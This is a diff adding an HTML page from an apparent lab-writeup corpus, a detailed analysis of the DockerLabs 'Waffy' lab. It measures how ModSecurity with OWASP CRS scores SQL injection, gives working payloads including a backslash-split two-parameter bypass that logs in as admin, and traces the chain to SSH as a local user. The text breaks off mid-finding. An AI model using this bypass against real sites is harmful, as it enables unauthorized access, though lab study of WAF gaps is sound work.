@@ -1,0 +1,1136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 84 Waffy &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Waffy</p><h1 id="84-waffy--writeup">84 Waffy — writeup</h1>
+<p><strong>Lab:</strong> <code>84|Waffy|dificil</code> — &quot;Bypass del WAF Modsecurity instalado en Apache.&quot;
+<strong>IP:</strong> <code>[net-0-9]</code> (single container, single bridge network; <code>auto_deploy.sh</code> read, not run).</p>
+<hr />
+<h2 id="the-answer-first-did-lab-218s-rule-survive-a-real-modsecurity">The answer first: did lab 218's rule survive a real ModSecurity?</h2>
+<p><strong>Partly — and the half that survived is the weaker half. The class row in <code>RUNBOOK.md</code> §5 needs correcting, not extending.</strong></p>
+<p>Lab 218's rule has two clauses. Measured against ModSecurity 2.9.7 + OWASP CRS 4.18.0-dev:</p>
+<table>
+<thead>
+<tr>
+<th>218's clause</th>
+<th>Verdict here</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><em>A blocklist names what you already know; the bypass is the unlisted encoding of the same syntax</em></td>
+<td><strong>Did not generalise as written.</strong> Against libinjection there is no &quot;unlisted encoding&quot; to reach for. I tried the whole family — alternate comment syntax, mixed case, MySQL versioned comments <code>/*!…*/</code>, tab and newline separators, <code>#</code> instead of <code>--</code>, percent-encoded and double-percent-encoded quotes. <strong>10 quote-bearing variants tested, 10 blocked, 0 successes</strong> (V1–V7, W3–W5, N1–N3 below).</td>
+<td>scores 13–18 against a threshold of 5</td>
+</tr>
+<tr>
+<td><em>A filter that validates a string hands the shell a pattern</em></td>
+<td><strong>The shape survives; the mechanism does not.</strong> There is no glob to hand ModSecurity, and no unfiltered string for it to mis-parse. What replaces it is the same <em>gap</em> in a different guise: <strong>the WAF scores each variable independently, while the sink composes them into one.</strong> That is why the bypass below works, and it is a finding about the engine's scoring model, not about cleverness with a token.</td>
+<td>§Findings F1</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Why 218's rule was a toy-filter artefact, stated precisely.</strong> Lab 218's filter was
+<code>strpos()</code>/<code>preg_match()</code> over <strong>one already-decoded PHP string</strong>: no declared variable
+set, no transformation pipeline, no scoring, one request field. ModSecurity matches a
+<strong>named list of variables</strong> after a <strong>declared pipeline</strong>, then <strong>sums an anomaly score</strong>
+against a threshold. Read off the artefact, rule 942100
+(<code>REQUEST-942-APPLICATION-ATTACK-SQLI.conf:66</code>):</p>
+<pre><code>SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS:User-Agent|
+        REQUEST_HEADERS:Referer|ARGS_NAMES|ARGS|XML:/* &quot;@detectSQLi&quot; \
+    &quot;id:942100, phase:2, block, ...,
+    t:none,t:utf8toUnicode,t:urlDecodeUni,t:removeNulls, ...
+    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'&quot;
+</code></pre>
+<p>So there is no &quot;string after decoding&quot; that can be <em>unlisted</em> — there is a <strong>set of
+variables</strong> and a <strong>threshold</strong>. 218's rule was generalisable <em>about string blocklists</em>,
+and this lab is not a string blocklist. That is the correction.</p>
+<p><strong>And one 218 discriminator is refuted outright here.</strong> 218 taught: <em>discriminate block
+from wrong-payload by <strong>body hash</strong>.</em> Against a real engine that does not hold —
+ModSecurity's block page is Apache's <strong>stock, unbranded 403 document</strong>, and it is <strong>not
+byte-stable</strong>, because it embeds the <code>Host</code> it refused:</p>
+<table>
+<thead>
+<tr>
+<th>Response</th>
+<th>Status</th>
+<th>Bytes</th>
+<th>sha256 (16)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ModSecurity block, <code>Host: [net-0-9]</code></td>
+<td>403</td>
+<td>275</td>
+<td><code>1630ab41ca37e421</code></td>
+</tr>
+<tr>
+<td><strong>Same block, <code>Host: waffy.dl</code></strong></td>
+<td>403</td>
+<td><strong>273</strong></td>
+<td><strong><code>f5fefd67ac851ba2</code></strong></td>
+</tr>
+<tr>
+<td>Apache's own 404</td>
+<td>404</td>
+<td>272</td>
+<td><code>8572b00f4a99b589</code></td>
+</tr>
+</tbody>
+</table>
+<p>Identical event, two different hashes. Body hash is only a discriminator if you hold
+<code>Host</code> fixed. <strong>The discriminator that actually worked in this lab was the <code>Location</code>
+header</strong> — see F5 and Instrumentation defect 3.</p>
+<hr />
+<h2 id="surface">Surface</h2>
+<pre><code>$ nmap -sV -Pn -p- --open [net-0-9]
+Nmap scan report for [net-0-9]
+Host is up (0.000045s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+</code></pre>
+<p><strong>Stack and versions — from the artefact, not from memory:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Version</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Apache httpd</td>
+<td>2.4.58 (Ubuntu)</td>
+<td><code>nmap -sV</code>; <code>error.log</code> <code>AH00163</code></td>
+</tr>
+<tr>
+<td>ModSecurity</td>
+<td><strong>2.9.7</strong></td>
+<td><code>dpkg -l libapache2-mod-security2 2.9.7-1build3</code>; <code>error.log</code> <code>ModSecurity for Apache/2.9.7 … configured.</code></td>
+</tr>
+<tr>
+<td>OWASP CRS</td>
+<td><strong>4.18.0-dev</strong> (package <code>modsecurity-crs 3.3.5-2</code>)</td>
+<td>every rule's <code>ver:'OWASP_CRS/4.18.0-dev'</code>; <code>error.log</code></td>
+</tr>
+<tr>
+<td>PHP</td>
+<td>8.3.6 (<code>libapache2-mod-php8.3 2:8.3+93ubuntu2</code>)</td>
+<td><code>mods-enabled/php8.3.load</code></td>
+</tr>
+<tr>
+<td>MariaDB</td>
+<td>10.11.13, <code>utf8mb4</code></td>
+<td><code>SELECT @@version, @@sql_mode, @@character_set_server</code></td>
+</tr>
+<tr>
+<td>OpenSSH</td>
+<td>9.6p1</td>
+<td><code>nmap -sV</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Note the version disagreement, which is itself a fact:</strong> the Debian package says CRS
+<code>3.3.5</code>, every rule stamps <code>OWASP_CRS/4.18.0-dev</code>, and <strong>two</strong> CRS copies are on disk —
+<code>/etc/modsecurity/coreruleset/</code> (Aug 2025, the one <code>Include</code>d) and
+<code>/etc/modsecurity/crs/</code> (Oct 2023, <strong>not</strong> included). The older tree is dead weight that
+an operator editing &quot;the CRS&quot; would plausibly edit in the wrong place.</p>
+<p><strong>What a TCP scan cannot see — measured, not assumed.</strong> <code>nmap -p-</code> is TCP by definition.</p>
+<table>
+<thead>
+<tr>
+<th>Check</th>
+<th>Result</th>
+<th>Work count</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/proc/net/udp</code></td>
+<td><strong>0 data rows</strong> (header only)</td>
+<td>file read in full</td>
+</tr>
+<tr>
+<td><code>/proc/net/udp6</code></td>
+<td><strong>0 data rows</strong></td>
+<td>file read in full</td>
+</tr>
+<tr>
+<td><code>docker inspect .Config.ExposedPorts</code></td>
+<td><code>null</code></td>
+<td>—</td>
+</tr>
+<tr>
+<td><strong><code>ss -tlnp</code></strong></td>
+<td><strong><code>127.0.0.1:3306</code> MariaDB — loopback-only, and <code>closed</code> to <code>-p-</code></strong></td>
+<td>full listener table read</td>
+</tr>
+</tbody>
+</table>
+<p>MariaDB is the database behind the only sink and it is not on the wire at all. A TCP scan
+cannot show it; <code>ss</code> inside the container can. Negative carries its work count.</p>
+<p><strong>PID 1</strong> is <code>/bin/sh -c service ssh start &amp;&amp; service apache2 start &amp;&amp; service mariadb start &amp;&amp; tail -f /dev/null</code>
+— no systemd, no journal. Relevant only as a caution: any log-file-scraping control here
+would face the same dead backend lab 218 documented for fail2ban.</p>
+<hr />
+<h2 id="the-class">The class</h2>
+<p><strong>Entry criterion (RUNBOOK §5, the question that started it):</strong> <em>Does the filter read the
+request, or the string after decoding?</em></p>
+<p><strong>Source that settled it:</strong> the rule set is not in application code at all. It is
+<code>/etc/apache2/mods-available/security2.conf:1-7</code> plus
+<code>/etc/modsecurity/coreruleset/rules/*.conf</code> (47 files).</p>
+<h3 id="the-rule-set-read-from-the-artefact">The rule set, read from the artefact</h3>
+<p><strong>Enforcement point — Apache module, in-process, not a reverse proxy, not the application:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Question</th>
+<th>Answer</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Module or proxy?</td>
+<td><strong>Apache module.</strong> <code>mods-enabled/security2.load</code> → <code>LoadModule security2_module /usr/lib/apache2/modules/mod_security2.so</code> (935544 bytes)</td>
+<td>read directly</td>
+</tr>
+<tr>
+<td>Is it a reverse proxy?</td>
+<td><strong>No.</strong> All 37 <code>Proxy</code> matches in <code>/etc/apache2/</code> are <code>ProxyHTMLLinks</code>/<code>ProxyHTMLEvents</code> (mod_proxy_html link rewriting) and <code>ProxyStatus On</code>. <strong>Zero <code>ProxyPass</code>.</strong></td>
+<td>grepped, comments excluded</td>
+</tr>
+<tr>
+<td>Who owns :80?</td>
+<td><code>apache2</code> pid 34 directly — no upstream</td>
+<td><code>ss -tlnp</code></td>
+</tr>
+<tr>
+<td>Same process as PHP?</td>
+<td><strong>Yes</strong> — <code>mpm_prefork</code>, pid 34 root + pid 39 www-data, both <code>apache2</code></td>
+<td><code>ps</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong><code>SecRuleEngine</code> — enforcing, not <code>DetectionOnly</code>, and it is a first-class fact:</strong></p>
+<pre><code>/etc/apache2/sites-available/000-default.conf
+1  &lt;VirtualHost *:80&gt;
+4          DocumentRoot /var/www/html
+8          &lt;IfModule security2_module&gt;
+9              SecRuleEngine On
+10         &lt;/IfModule&gt;
+11 &lt;/VirtualHost&gt;
+</code></pre>
+<p><code>SecRuleEngine On</code> appears <strong>exactly once in the entire Apache tree</strong> (grepped
+<code>/etc/apache2/</code>, 2 hits, the other being <code>000-default.conf.dpkg-old</code>). Enforcing is
+<strong>measured, not read</strong>: rule <code>949110</code> (<code>REQUEST-949-BLOCKING-EVALUATION.conf:226-233</code>) is
+<code>deny</code> in <code>phase:2</code>, and it fires — <code>Access denied with code 403 (phase 2)</code>.</p>
+<p><strong>⚠️ <code>SecRuleEngine On</code> is inside the <code>&lt;VirtualHost&gt;</code>, not at server scope.</strong> ModSecurity's
+default is <code>Off</code>. The measured config fact: the directive exists once, vhost-scoped, and
+nowhere at server level. <em>Inferred consequence (flagged as inference, not measured):</em> any
+vhost added to this image later would have the module and all 47 rule files loaded and the
+engine <strong>off</strong>, i.e. a silent total bypass. I could not demonstrate it — <code>sites-enabled/</code>
+contains only <code>000-default.conf</code>, so there is no second vhost to test. Not claimed.</p>
+<p><strong>Paranoia level: 1.</strong> First-class, and it changes everything. <code>crs-setup.conf</code> leaves
+every paranoia directive commented out; the default is set by the rule itself at
+<code>REQUEST-901-INITIALIZATION.conf:116-123</code> (<code>setvar:'tx.blocking_paranoia_level=1'</code>), and
+<code>:126-133</code> copies it into <code>detection_paranoia_level</code>. Independently confirmed by every
+score line the engine emits: <code>per_pl=1-0-0-0</code>. PL2+ rules exist in the tree and <strong>do not
+run</strong>.</p>
+<p><strong>Scoring model, from <code>crs-setup.conf</code> — all three defaults are commented out, so the CRS
+built-ins apply:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Line</th>
+<th>Directive</th>
+<th>Effective value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>crs-setup.conf:274</code></td>
+<td><code># setvar:tx.critical_anomaly_score=5</code></td>
+<td><strong>5</strong></td>
+</tr>
+<tr>
+<td><code>crs-setup.conf:276</code></td>
+<td><code># setvar:tx.warning_anomaly_score=3</code></td>
+<td><strong>3</strong></td>
+</tr>
+<tr>
+<td><code>crs-setup.conf:328</code></td>
+<td><code># setvar:tx.inbound_anomaly_score_threshold=5</code></td>
+<td><strong>5</strong></td>
+</tr>
+<tr>
+<td><code>crs-setup.conf:97-98</code></td>
+<td><code>SecDefaultAction &quot;phase:1,…,pass&quot;</code> / <code>&quot;phase:2,…,pass&quot;</code></td>
+<td>rules <strong>log and pass</strong>; only <code>949110</code> denies</td>
+</tr>
+</tbody>
+</table>
+<h3 id="secrequestbodyaccess--off-and-i-measured-it-rather-than-assuming-it"><code>SecRequestBodyAccess</code> — Off, and I measured it rather than assuming it</h3>
+<p><strong>No <code>modsecurity.conf</code> is included anywhere.</strong> <code>security2.conf</code> is only 7 lines
+(<code>SecDataDir</code> + two <code>IncludeOptional</code> for the CRS); it never pulls in
+<code>modsecurity.conf-recommended</code>, and <code>/etc/modsecurity/modsecurity.conf</code> <strong>does not exist</strong>.
+So <code>SecRequestBodyAccess</code> is unset and defaults to <strong>Off</strong>.</p>
+<p>Proven with a differential, because &quot;unset&quot; is not the same as &quot;the body is not read&quot;:</p>
+<table>
+<thead>
+<tr>
+<th>Probe</th>
+<th>Payload</th>
+<th>Status</th>
+<th>Rules fired</th>
+<th><code>COMBINED_SCORE</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>B1 <strong>GET</strong></td>
+<td><code>' or 1=1-- -</code> in the query string</td>
+<td><strong>403</strong></td>
+<td><code>920350, 942100, 949110, 980170</code></td>
+<td><strong>8</strong></td>
+</tr>
+<tr>
+<td>B2 <strong>POST</strong> form-encoded</td>
+<td>the <em>byte-identical</em> string in the body</td>
+<td>200</td>
+<td><code>920350, 980170</code></td>
+<td><strong>3</strong> (baseline only)</td>
+</tr>
+<tr>
+<td>B3 <strong>POST</strong> JSON</td>
+<td>same string as a JSON value</td>
+<td>200</td>
+<td><code>920350, 980170</code></td>
+<td><strong>3</strong> (baseline only)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>942100 is absent from both POST slices and present in the GET slice.</strong> The same bytes,
+the same engine, the same rule language — <strong>+5 in the query string, 0 in the body.</strong> That
+is the work count that makes this a finding rather than an absence: without it, &quot;no rule
+fired&quot; would be indistinguishable from &quot;no rule looked&quot;.</p>
+<p><strong>This is not exploitable in this lab, and that is a separate finding (F3).</strong> The sink
+reads <code>$_GET</code> only (<code>index.php:122-123</code>), so a POST body never reaches the SQL — B2's 200
+is the <em>untouched login page</em>, sha <code>26a69b2846a52372</code>, byte-identical to a plain <code>GET /index.php</code>. <strong>A 200 that renders the login page proves nothing</strong> and is recorded as such.</p>
+<h3 id="what-a-modsecurity-block-actually-looks-like">What a ModSecurity block actually looks like</h3>
+<p>The literal body, in full:</p>
+<pre><code class="language-html">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.58 (Ubuntu) Server at [net-0-9] Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+<p>Headers: <code>HTTP/1.1 403 Forbidden</code>, <code>Server: Apache/2.4.58 (Ubuntu)</code>, <code>Content-Length: 275</code>,
+<code>Content-Type: text/html; charset=iso-8859-1</code>. <strong>No rule ID. No anomaly score. No
+<code>Server: ModSecurity</code>. No vendor fingerprint whatsoever.</strong></p>
+<p><strong>So: can a ModSecurity block be told apart from an application 4xx?</strong></p>
+<ul>
+<li><strong>Against another Apache-generated error: yes, but only by text and byte count</strong> — 275 B
+vs Apache's 404 at 272 B, different <code>h1</code>/<code>p</code>. Fragile, and <em>not</em> stable across <code>Host</code>
+values (273 B with <code>Host: waffy.dl</code>).</li>
+<li><strong>Against an application 4xx: the question is empty here, and that is the real answer.</strong>
+This application <strong>never emits a 403.</strong> Its failure modes are <code>200</code> (login form),
+<code>302 → /index.php</code> (wrong credentials, <code>index.php:140</code>) and <code>200</code> (the PDOException
+message, <code>index.php:135-138</code>). So a 403 <em>is</em> attributable in this lab — <strong>not because
+the body is branded, but because I enumerated the app's own status set and 403 is not in
+it.</strong> Attributability came from reading the application, not from the WAF's fingerprint.</li>
+</ul>
+<p><strong>Enforcement happens before the application runs — measured, not inferred:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Request</th>
+<th><code>[response-cookie-header]</code> headers</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>blocked (<code>' or 1=1-- -</code>)</td>
+<td><strong>0</strong></td>
+</tr>
+<tr>
+<td>allowed (<code>name=abc&amp;password=abc</code>)</td>
+<td><strong>1</strong> — <code>PHPSESSID=fdqha29…</code></td>
+</tr>
+</tbody>
+</table>
+<p><code>index.php:102</code> calls <code>session_start()</code> on every request, so a pass <em>always</em> emits a
+session cookie. A block emitting <strong>zero</strong> cookies proves <code>mod_php</code> never executed: the
+deny happens in the Apache fixup phase, ahead of the content handler. That is the
+signature of an in-process module filter, and it is the observable that distinguishes
+&quot;blocked by the WAF&quot; from &quot;reached the app and the app refused&quot;.</p>
+<h3 id="the-bypass-class-rule-based-not-transformation-based">The bypass class: rule-based, not transformation-based</h3>
+<p><strong>The <code>ARGS</code> list in 942100 is the attack surface, and it is finite and named.</strong> A
+transformation bypass would be a payload that survives <code>t:none,t:utf8toUnicode, t:urlDecodeUni,t:removeNulls</code> and evades the signature. I could not build one (10
+variants, 10 blocks). The bypass that works is <strong>rule-based</strong>: the payload is split across
+<strong>two variables the engine scores separately</strong>, and MySQL's string-literal continuation
+reassembles them.</p>
+<p><strong>First, prove the normalisation step rather than assume it</strong> (three spellings of the same
+payload, same score, same hash — so the engine decoded all of them to the same value):</p>
+<table>
+<thead>
+<tr>
+<th>Probe</th>
+<th>Spelling on the wire</th>
+<th>Status</th>
+<th>sha256 (16)</th>
+<th><code>942100</code></th>
+<th>Score</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>N1</td>
+<td><code>' or 1=1-- -</code> (raw)</td>
+<td>403</td>
+<td><code>f5fefd67ac851ba2</code></td>
+<td>fired</td>
+<td>5</td>
+</tr>
+<tr>
+<td>N2</td>
+<td><code>%27%20or%201%3D1--%20-</code></td>
+<td>403</td>
+<td><code>f5fefd67ac851ba2</code></td>
+<td>fired</td>
+<td>5</td>
+</tr>
+<tr>
+<td>N3</td>
+<td><code>%2527%2520or%25201%253D1--%2520-</code> (<strong>double</strong>-encoded)</td>
+<td>403</td>
+<td><code>f5fefd67ac851ba2</code></td>
+<td>fired</td>
+<td>5</td>
+</tr>
+</tbody>
+</table>
+<p>N3 is the informative one. <code>t:urlDecodeUni</code> is applied to a value ModSecurity has already
+percent-decoded once, so the engine ends up <strong>decoding twice</strong> and sees <code>' or 1=1-- -</code>,
+while PHP's <code>$_GET</code> decodes <strong>once</strong> and would have received the literal text
+<code>%27%20or%201%3D1--%20-</code>. <strong>ModSecurity over-normalises relative to the application</strong> —
+it decodes <em>deeper</em> than the sink does, so it is stricter than the app, not looser. This
+is the opposite direction from the usual parser differential and worth stating: a
+double-encoded payload is caught <em>because</em> the WAF decodes more than the app, which is
+why &quot;just double-encode it&quot; fails here.</p>
+<p><strong>Then, the discriminator that produced the bypass</strong> — the two arguments scored in
+isolation, against the same live engine:</p>
+<table>
+<thead>
+<tr>
+<th>Probe</th>
+<th><code>name</code></th>
+<th><code>password</code></th>
+<th>Rules fired</th>
+<th>Score</th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>W1</td>
+<td><code>\</code></td>
+<td><code>x</code></td>
+<td><code>920350, 980170</code></td>
+<td><strong>3</strong> (baseline)</td>
+<td>backslash alone is invisible</td>
+</tr>
+<tr>
+<td>W2</td>
+<td><code>x</code></td>
+<td><code>OR 1=1-- -</code></td>
+<td><code>920350, 980170</code></td>
+<td><strong>3</strong> (baseline)</td>
+<td>tautology alone is invisible</td>
+</tr>
+<tr>
+<td>W3</td>
+<td><code>\</code></td>
+<td><code>UNION SELECT 1,0x…444c38344d41524b,2-- -</code></td>
+<td><code>+942100, 942190</code></td>
+<td><strong>13</strong></td>
+<td><code>UNION SELECT</code> is the trigger</td>
+</tr>
+<tr>
+<td>W4</td>
+<td><code>\</code></td>
+<td><code>UNION SELECT 1,'DL84MARK',2-- -</code></td>
+<td><code>+942100, 942190</code></td>
+<td><strong>13</strong></td>
+<td>not the quotes</td>
+</tr>
+<tr>
+<td>W5</td>
+<td><code>\</code></td>
+<td><code>UNION SELECT 1,0x…444c38344d41524b,2#</code></td>
+<td><code>+942100, 942190</code></td>
+<td><strong>13</strong></td>
+<td>not the comment style</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Both halves of the injection are individually worth zero points. The moment they are
+combined into a single parameter, <code>UNION SELECT</code> lights up both <code>942100</code> (libinjection)
+and <code>942190</code> (generic regex) for +10.</strong> So the WAF's blind spot is not lexical, it is
+<strong>compositional</strong> — and that is precisely why the payload must never be assembled in one
+variable.</p>
+<p><strong>The source-read fact that made it work, and it was a prediction before it was a test:</strong>
+<code>SELECT @@sql_mode</code> returns <code>STRICT_TRANS_TABLES, ERROR_FOR_DIVISION_BY_ZERO, NO_AUTO_CREATE_USER, NO_ENGINE_SUBSTITUTION</code>. <strong><code>NO_BACKSLASH_ESCAPES</code> is absent</strong>, so
+MySQL honours backslash escapes — a backslash inside a string literal escapes the closing
+quote. Everything else in the exploit follows from that one line of configuration.</p>
+<hr />
+<h2 id="chain">Chain</h2>
+<p>The sink, read before any request was sent:</p>
+<pre><code class="language-php">/var/www/html/index.php
+121     // Recogemos desde GET
+122     $username = $_GET['name'];
+123     $password = $_GET['password'];
+124
+125     // VULNERABILIDAD: Consulta SQL concatenada directamente con entrada de usuario
+126     $consult = &quot;SELECT * FROM users WHERE username = '$username' AND passwd = '$password'&quot;;
+127     $send = $conet-&gt;query($consult);
+</code></pre>
+<pre><code class="language-sql">-- with name = \   and   password = OR 0x444c…=0x444c…-- -
+SELECT * FROM users WHERE username = '\' AND passwd = 'OR 0x444c…=0x444c…-- -'
+                                                                        ↑
+                                          the \' does not close the literal
+</code></pre>
+<p>MySQL parses <code>'\' AND passwd = '</code> as <strong>one</strong> string literal (the backslash escapes the
+quote), then evaluates <code>OR 0x…=0x…</code> as a predicate, then <code>-- -</code> comments out the trailing
+<code>'</code>. ModSecurity scored <code>\</code> and <code>OR 0x…=0x…-- -</code> as two unrelated strings.</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>→</th>
+<th>Mechanism</th>
+<th>Identity proof</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>www-data</code> uid 33</td>
+<td><code>index.php:126</code> — <code>$conet-&gt;query()</code> reached with the two halves carried in <code>name</code> and <code>password</code>. No rule fired: <code>newlog=0</code>.</td>
+<td><strong>Not</strong> inferred from a 200. The session value the sink wrote is the DB's own <code>username</code> column — see hop 2.</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>www-data</code> uid 33</td>
+<td><code>$_SESSION['user'] = $row[&quot;username&quot;]</code> (<code>index.php:131</code>) → auth granted</td>
+<td><code>admin.php:87</code> renders <strong><code>¡Bienvenido, balutin!</code></strong> — <code>balutin</code> is a <strong>database value</strong>, not anything I supplied. A supplied password of <code>OR 0x…=0x…-- -</code> matches no stored row, so a returned row is only possible if the SQL was restructured. <strong>The sink proved its own execution.</strong></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>baluton</code> uid 1000</td>
+<td>SSH with the credentials the admin panel hands out (<code>admin.php:90-91</code>)</td>
+<td><code>id</code> → <code>uid=1000(baluton) gid=1000(baluton) groups=1000(baluton)</code>; <code>id -u</code> → <code>1000</code>; <code>id -un</code> → <code>baluton</code>; <code>whoami</code> → <code>baluton</code> — four ways, not inferred from a successful login</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Root was not reached and is not claimed.</strong> <code>ls -la /root</code> → <code>Permission denied</code>;
+<code>/opt</code> and <code>/srv</code> are empty; no <code>sudoers</code> line, SUID sweep or capability test was run
+(explicitly NOT tested, below).</p>
+<h3 id="the-positive-control-and-why-it-is-a-control">The positive control, and why it is a control</h3>
+<p><strong>A marked oracle, because a 302 that redirects proves nothing.</strong> <code>OR 0x&lt;TOKEN&gt;=0x&lt;TOKEN&gt;</code>
+carries a per-engagement random token (<code>DL84AF3C91B7E2</code> →
+<code>0x444c383441463343393142374532</code>) as a <em>conditional</em>: the login can only succeed if the
+engine evaluated that exact hex comparison and found it true. Paired with a negative that
+differs in <strong>one hex digit</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>Request</th>
+<th><code>password</code></th>
+<th><code>Location</code></th>
+<th>Interpretation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>X1 positive</strong></td>
+<td><code>OR 0x444c…4532=0x444c…4532-- -</code></td>
+<td><strong><code>/admin.php</code></strong></td>
+<td>injection executed, row returned, session set</td>
+</tr>
+<tr>
+<td><strong>X2 negative</strong></td>
+<td><code>OR 0x444c…4532=0x444c…4533-- -</code></td>
+<td><strong><code>/index.php</code></strong></td>
+<td>comparison false → no row → login refused</td>
+</tr>
+</tbody>
+</table>
+<p>Identical shape, identical status, identical body — <strong>one hex digit apart, opposite
+outcomes.</strong> That is the differential, and it is what makes X1 a result rather than a
+coincidence.</p>
+<p><strong>The engine-liveness control — the one that keeps this honest.</strong> &quot;0 rules fired&quot; is
+indistinguishable from &quot;nothing looked&quot;, so I proved the engine was reading <em>that exact
+request</em> by adding a third parameter that must fire:</p>
+<table>
+<thead>
+<tr>
+<th>Probe</th>
+<th><code>zzzprobe</code></th>
+<th>Rules fired</th>
+<th>What the log says</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>N6</td>
+<td><code>' or 1=1-- -</code></td>
+<td><code>942100, 949110, 980170</code></td>
+<td><strong><code>Matched Data: s&amp;1c found within ARGS:zzzprobe: ' or 1=1-- -&quot;</code></strong></td>
+</tr>
+<tr>
+<td>N7</td>
+<td><code>harmless</code></td>
+<td>none</td>
+<td>—</td>
+</tr>
+</tbody>
+</table>
+<p>The log names <strong><code>ARGS:zzzprobe</code></strong> and <em>only</em> <code>ARGS:zzzprobe</code>. So on that identical request
+line the engine was alive, was scoring the arguments, and found <strong>nothing in <code>name</code> or
+<code>password</code></strong>. The bypass scores a <strong>true zero</strong>, not an untested zero.</p>
+<p><strong>And the negative that justifies the whole exercise</strong> — a single-parameter payload cannot
+get through. <strong>10 quote-bearing variants tested, 10 blocked at 403, 0 successes:</strong></p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Payload in <code>name</code></th>
+<th>Score</th>
+<th>Rule IDs</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>V1</td>
+<td><code>' UNION SELECT '…'-- -</code></td>
+<td>18</td>
+<td><code>942100, 942190, 942360, 949110</code></td>
+</tr>
+<tr>
+<td>V2</td>
+<td><code>'/**/UNION/**/SELECT/**/'…'-- -</code></td>
+<td>13</td>
+<td><code>942100, 942190, 949110</code></td>
+</tr>
+<tr>
+<td>V3</td>
+<td><code>' uNiOn sElEcT '…'-- -</code></td>
+<td>18</td>
+<td><code>942100, 942190, 942360, 949110</code></td>
+</tr>
+<tr>
+<td>V4</td>
+<td><code>'/*!UNION*/ /*!SELECT*/ '…'-- -</code></td>
+<td>18</td>
+<td><code>942100, 942190, 942500, 949110</code></td>
+</tr>
+<tr>
+<td>V5</td>
+<td>tab-separated</td>
+<td>18</td>
+<td><code>942100, 942190, 942360, 949110</code></td>
+</tr>
+<tr>
+<td>V6</td>
+<td>newline-separated</td>
+<td>18</td>
+<td><code>942100, 942190, 942360, 949110</code></td>
+</tr>
+<tr>
+<td>V7</td>
+<td><code>#</code> instead of <code>--</code></td>
+<td>18</td>
+<td><code>942100, 942190, 942360, 949110</code></td>
+</tr>
+<tr>
+<td>W3/W4/W5</td>
+<td><code>\</code> + <code>UNION SELECT …</code> in <code>password</code></td>
+<td>13</td>
+<td><code>942100, 942190, 949110</code></td>
+</tr>
+<tr>
+<td>N1/N2/N3</td>
+<td><code>' or 1=1-- -</code>, raw / encoded / double-encoded</td>
+<td>5</td>
+<td><code>942100, 949110</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Threshold 5, and the best single-parameter attempt reached 5.</strong> libinjection at PL1 is
+strong. The working bypass needed <strong>two</strong> parameters.</p>
+<hr />
+<h2 id="findings">Findings</h2>
+<h3 id="f1--authentication-bypass-sql-injection-split-across-two-independently-scored-waf-variables-cwe-89">F1 — Authentication bypass: SQL injection split across two independently-scored WAF variables (CWE-89)</h3>
+<p><code>index.php:126</code> concatenates <strong>two</strong> untrusted <code>$_GET</code> values into <strong>one</strong> SQL string
+literal. OWASP CRS scores each <code>ARGS</code> entry <strong>separately</strong> and sums the result, so a
+payload whose halves are individually benign is scored <strong>0</strong> while the database reassembles
+it into executable SQL.</p>
+<ul>
+<li><strong>Evidence:</strong> <code>name=\</code> + <code>password=OR 0x444c…=0x444c…-- -</code> → <code>302 Location: /admin.php</code>,
+<strong><code>newlog=0</code></strong> (no CRS rule fired, no anomaly score), then <code>admin.php</code> →
